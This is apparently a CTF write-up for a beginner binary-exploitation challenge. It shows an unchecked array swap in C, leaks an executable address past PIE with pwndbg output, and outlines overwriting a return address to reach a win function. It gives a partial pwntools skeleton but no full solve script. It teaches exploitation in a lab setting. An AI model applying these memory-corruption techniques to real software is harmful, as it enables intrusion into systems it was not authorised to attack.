# Solution Guide: Permutations
## Overview
This is an open source challenge, since the source code is given. There is a win function that reads a file and prints out the flag, which means our target will be to execute the function.

## Entry Point
```c
int idx_a, idx_b;
scanf("%d%d", &idx_a, &idx_b);
const char *t = fruits[idx_a]; // <-- should have checked idx_a and idx_b before this line
fruits[idx_a] = fruits[idx_b];
fruits[idx_b] = t;
printf("Swapped %s with %s\n", fruits[idx_b], fruits[idx_a]);
```
Looking at line 69 to 72, we can see that the index to read the array is used directly after reading from input, without performing any checks to ensure that the index is valid. In C, the array indexing operation is performed by calculating the address of the specified element (`pointer_to_start_of_array + size of each item * index`) and loading them from memory directly. Since we know that arrays defined like `int a[16]` are stored on the stack (as mentioned in the introduction workshop), we can know that if the array indexing goes out of bounds, the memory that the program uses will be the stack memory. Furthermore, these kind of swapping operation implies an arbitrary write onto the stack memory, so we might be able to manipulate the return address to direct the program to execute the `win` function.

## Exploring Constraints
### Getting the win address
To return to the `win` function, we first need to know the address of the win function. However, the operating system knows these kind of hacks, and has implemented a protection mechanism called **ASLR**, which is enabled by this executable[^1]:
```
$ pwn checksec chall
[*] 'chall'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
```
From the line `PIE enabled` (PIE: *Position Independent Executable*, which means that the program is compiled to not rely on being placed in specific memory addresses), the OS will *usually* load the executable into a randomized memory address. But this protection can be bypassed by **leaking** addresses that points to a region in the loaded executable. Since we know that the executable is loaded as a whole, the offset from the leak to the starting executable address loaded in memory is always the same. We can therefore derive the address of the executable and thus the address of the `win` function.

Next, let us see if there is anything we can leak. Use the following commands to stop the program after reading `cmd`:
```
start
disassemble main
# Comparing with the source code, we can see main+616 is the instruction right after scanf is called
bp main+616
```
And then look at the stack memory:
```
pwndbg> stack 40
00:0000│ rsp 0x7fffbeb7e310 —▸ 0x7fffbeb7e568 —▸ 0x7fffbeb8017e
01:0008│-128 0x7fffbeb7e318 ◂— 0x100000000
02:0010│-120 0x7fffbeb7e320 ◂— 0x10000000000037f
03:0018│-118 0x7fffbeb7e328 ◂— 0x191ef657
04:0020│-110 0x7fffbeb7e330 —▸ 0x7fffbeb7e520 —▸ 0x559db92fa1e0 (_start) ◂— endbr64 
05:0028│-108 0x7fffbeb7e338 ◂— 0
06:0030│-100 0x7fffbeb7e340 —▸ 0x559db92fb05c ◂— 0x614200656c707041 /* 'Apple' */
07:0038│-0f8 0x7fffbeb7e348 —▸ 0x559db92fb062 ◂— 0x4300616e616e6142 /* 'Banana' */
08:0040│-0f0 0x7fffbeb7e350 —▸ 0x559db92fb069 ◂— 0x4400797272656843 /* 'Cherry' */
09:0048│-0e8 0x7fffbeb7e358 —▸ 0x559db92fb070 ◂— 0x646c450065746144 /* 'Date' */
0a:0050│-0e0 0x7fffbeb7e360 —▸ 0x559db92fb075 ◂— 'Elderberry'
0b:0058│-0d8 0x7fffbeb7e368 —▸ 0x559db92fb080 ◂— 0x7061724700676946 /* 'Fig' */
0c:0060│-0d0 0x7fffbeb7e370 —▸ 0x559db92fb084 ◂— 0x6f48006570617247 /* 'Grape' */
0d:0068│-0c8 0x7fffbeb7e378 —▸ 0x559db92fb08a ◂— 'Honeydew'
0e:0070│-0c0 0x7fffbeb7e380 —▸ 0x559db92fb093 ◂— 'Indian Fig'
0f:0078│-0b8 0x7fffbeb7e388 —▸ 0x559db92fb09e ◂— 'Jackfruit'
10:0080│-0b0 0x7fffbeb7e390 —▸ 0x559db92fb0a8 ◂— 0x6d654c006977694b /* 'Kiwi' */
11:0088│-0a8 0x7fffbeb7e398 —▸ 0x559db92fb0ad ◂— 0x614d006e6f6d654c /* 'Lemon' */
12:0090│-0a0 0x7fffbeb7e3a0 —▸ 0x559db92fb0b3 ◂— 0x654e006f676e614d /* 'Mango' */
13:0098│-098 0x7fffbeb7e3a8 —▸ 0x559db92fb0b9 ◂— 'Nectarine'
14:00a0│-090 0x7fffbeb7e3b0 —▸ 0x559db92fb0c3 ◂— 0x500065676e61724f /* 'Orange' */
15:00a8│-088 0x7fffbeb7e3b8 —▸ 0x559db92fb0ca ◂— 0x5100617961706150 /* 'Papaya' */
16:00b0│-080 0x7fffbeb7e3c0 —▸ 0x559db92fb0d1 ◂— 0x520065636e697551 /* 'Quince' */
17:00b8│-078 0x7fffbeb7e3c8 —▸ 0x559db92fb0d8 ◂— 'Raspberry'
18:00c0│-070 0x7fffbeb7e3d0 —▸ 0x559db92fb0e2 ◂— 'Strawberry'
19:00c8│-068 0x7fffbeb7e3d8 —▸ 0x559db92fb0ed ◂— 'Tangerine'
1a:00d0│-060 0x7fffbeb7e3e0 —▸ 0x559db92fb0f7 ◂— 'Ugli fruit'
1b:00d8│-058 0x7fffbeb7e3e8 —▸ 0x559db92fb102 ◂— 0x616c6c696e6156 /* 'Vanilla' */
1c:00e0│-050 0x7fffbeb7e3f0 —▸ 0x559db92fb10a ◂— 'Watermelon'
1d:00e8│-048 0x7fffbeb7e3f8 —▸ 0x559db92fb115 ◂— 0x6559006175676958 /* 'Xigua' */
1e:00f0│-040 0x7fffbeb7e400 —▸ 0x559db92fb11b ◂— 'Yellow Passion Fruit'
1f:00f8│-038 0x7fffbeb7e408 —▸ 0x559db92fb130 ◂— 'Zucchini'
20:0100│-030 0x7fffbeb7e410 ◂— 0x70617773 /* 'swap' */
21:0108│-028 0x7fffbeb7e418 ◂— 0
22:0110│-020 0x7fffbeb7e420 ◂— 0
23:0118│-018 0x7fffbeb7e428 —▸ 0x7f7a83a23af0 (dl_main) ◂— endbr64 
24:0120│-010 0x7fffbeb7e430 —▸ 0x7fffbeb7e520 —▸ 0x559db92fa1e0 (_start) ◂— endbr64 
25:0128│-008 0x7fffbeb7e438 ◂— 0x46a265d72c508f00
26:0130│ rbp 0x7fffbeb7e440 —▸ 0x7fffbeb7e4e0 —▸ 0x7fffbeb7e540 ◂— 0
27:0138│+008 0x7fffbeb7e448 —▸ 0x7f7a8380d1ca (__libc_start_call_main+122) ◂— mov edi, eax
```
(Notice that values with the prefix `0x` indicates that it is a hexadecimal value. Recognise patterns for the numbers: addresses that start with `0x7fff` are stack addresses, and addresses that start with `0x55` are in the executable. You can see the mapped memory regions by using `vmmap`.)

Notice how when we use the `swap` command, the character pointer to the string is dereferenced, and the contents pointed to by the pointer (`char*`) is printed out. The machine code does not know what the type of the data pointed to by the pointer is, it only knew it is programmed to treat it like a string, so it will happily print out the contents of the memory location until a null byte is encountered.

Now we want an address in the executable. Therefore, we wish to find a *pointer* that points to *a location* that **stores** memory address in the executable, so that when this pointer is dereferenced, the contents pointed to by the pointer (i.e. an executable memory address) are shown to us. Looking at the stack memory above, we see the `0x24`th line and `0x04`th line are good choices. As those locations have a pointer that points to the executable.[^2]

We'll choose the `0x24`th line. We can calculate the offset from the start of the executable to the address we leaked:
```
pwndbg> vmmap 0x559db92fa1e0
LEGEND: STACK | HEAP | CODE | DATA | WX | RODATA
             Start                End Perm     Size Offset File (set vmmap-prefer-relpaths on)
    0x559db92f9000     0x559db92fa000 r--p     1000      0 src/chall
►   0x559db92fa000     0x559db92fb000 r-xp     1000   1000 src/chall +0x1e0
    0x559db92fb000     0x559db92fc000 r--p     1000   2000 src/chall
```
which is 0x11e0.

### Bringing your own pointers
After we derived the win address, how do we make it as the return address of `win`? Notice when `cmd` is read, our input is read into a buffer on the stack. That means it is accessible when we use `swap`! You can figure out the rest.

## Implementation
The basic idea is to perform the following steps:
1. Trigger a executable leak, and use it to derive the address of the `win` function.
2. Enter the address of the `win` function into the stack.
3. Move the address that we entered into the return function.
4. Gracefully exit the program.
5. Wait for the flag.

Now you should have a basic idea on what is going on, and roughly how this challenge can be solved. Now it is up to you to implement the exploit! Observe the following tips if you got stuck.

### Calculating index to be supplied
In 64-bit computers, pointers are 64-bits (8 bytes). Any `char*`, `int*`, `long*` etc. are 8 bytes long. Therefore, the array indexing in `swap` adds the memory address by 8 bytes.

### Entering the win function address into the program
The bytes that you will need to enter are not printable characters, and so typing them out won't be effective. Instead, develop a solve script to send the bytes with a program. The de-facto standard in the CTF community is *pwntools*, if you have no idea, please give it a try: (This is **NOT** the final solve script)
```python
from pwn import *

io = remote('<the challenge server>', 4000) # replace with the port number of the challenge
payload = b'swap 1 2' # your payload here
io.sendlineafter(b'\n> ', payload)
line = io.recvline()
# Get the leak from the line...
# You can try the unpack() function to convert the leaked bytes into a number:
address = unpack(b'\xef\xbe\xad\xde'.ljust(8, b'\x00')) # address = 0xdeadbeef
# Or convert an address number to its bytes representation, as in the memory:
addr_payload = pack(0xcafe) # b'\xfe\xca\x00\x00\x00\x00\x00\x00'
io.interactive()
```
Don't forget to run it with `python3 DEBUG` to give you more information!

### Why is the number that I entered appeared in reverse?
x86_64 is a *little endian* architecture, meaning that numbers are stored in memory in reverse. For example, if the number is `0xdeadbeef`, it will be stored as `ef be ad de`, from low memory address to high memory address.

## Remarks
Personally, I think it is important to understand these ideas before you move on to other `pwn` challenges in any CTF. If you are interested in the catagory of `pwn`, please try your best to solve this challenge.

[^1]: Install `pwntools` to get the `pwn` command, and then run it in your terminal.

[^2]: `_start` is a function in the executable, again as mentioned in the introduction workshop.
